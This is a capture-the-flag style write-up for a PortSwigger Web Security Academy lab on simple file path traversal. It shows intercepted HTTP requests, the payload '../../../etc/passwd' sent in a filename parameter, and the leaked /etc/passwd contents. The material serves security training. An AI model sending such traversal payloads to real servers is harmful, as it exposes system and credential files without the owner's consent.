# [Lab 1: File path traversal, simple case](https://portswigger.net/web-security/file-path-traversal/lab-simple)

---

## Description

This lab contains a [file path traversal](https://portswigger.net/web-security/file-path-traversal) vulnerability in the display of product images.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

---

## Solution

View the page source and notice that each of the product images are rendered by an `img` tag whose `src` attribute is set to `/image?filename=$FILENAME`.

![](images/Pasted%20image%2020210817213035.png)

Perhaps the backend is passing the value of the `filename` query parameter into some file system API call to retrieve its contents unsanitized. Intercept a request to `/image` for further tampering.

```http
GET /image?filename=31.jpg HTTP/1.1
Host: ac8f1f0e1fcba4ac80583f13001400df.web-security-academy.net
Cookie: session=3Wsm2nAgyACF2BSNKoIyOP7vXw6L2q9h
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Cache-Control: max-age=0
Te: trailers
Connection: close
```

Using the `filename` parameter, attempt to traverse backwards one directory until you are able to read the contents of `/etc/passwd`. Assume a Linux backend.

```http
GET /image?filename=../../../etc/passwd HTTP/1.1
Host: ac8f1f0e1fcba4ac80583f13001400df.web-security-academy.net
Cookie: session=3Wsm2nAgyACF2BSNKoIyOP7vXw6L2q9h
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Cache-Control: max-age=0
Te: trailers
Connection: close
```

```txt
HTTP/1.1 200 OK
Content-Type: image/jpeg
Connection: close
Content-Length: 1205

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:2001:2001::/home/peter:/bin/bash
carlos:x:2002:2002::/home/carlos:/bin/bash
user:x:2000:2000::/home/user:/bin/bash
elmer:x:2099:2099::/home/elmer:/bin/bash
dnsmasq:x:101:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
messagebus:x:102:101::/nonexistent:/usr/sbin/nologin
```

The `filename` `../../../etc/passwd` yields the contents of the `/etc/passwd` file, solving the challenge.
